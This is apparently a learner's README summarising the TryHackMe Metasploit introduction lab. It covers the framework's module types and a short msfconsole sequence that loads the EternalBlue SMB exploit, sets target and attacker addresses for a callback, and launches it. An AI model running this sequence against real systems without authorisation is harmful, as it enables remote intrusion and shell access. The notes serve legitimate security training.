# Room: Metasploit Introduction - TryHackMe

This folder contains my notes and practical experience from the **Metasploit: Introduction** module on TryHackMe. Metasploit is the most widely used penetration testing framework globally.

## 🔍 Core Concepts Covered

### 1. Architecture & Components
Understanding the modular structure of the Metasploit Framework (MSF):
*   **Exploits:** Code that takes advantage of a vulnerability to deliver a payload.
*   **Payloads:** The malicious code that runs on the target after successful exploitation (e.g., Meterpreter, reverse shells).
*   **Auxiliary:** Modules used for scanning, fuzzing, and information gathering (no payloads delivered).
*   **Post:** Modules used after exploitation for deep reconnaissance and privilege escalation.

### 2. Basic Command Workflow (`msfconsole`)
Navigating the command-line interface efficiently:

```bash
# Start the console quietly without banners
msfconsole -q

# Search for vulnerabilities or target software
search eternalblue

# Select and configure a specific module
use exploit/windows/smb/ms17_010_eternalblue
show options

# Set target and attacker parameters
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>

# Launch the attack
exploit
```

---
*Disclaimer: All activities were performed legally within TryHackMe's sandboxed lab environment for educational purposes.*

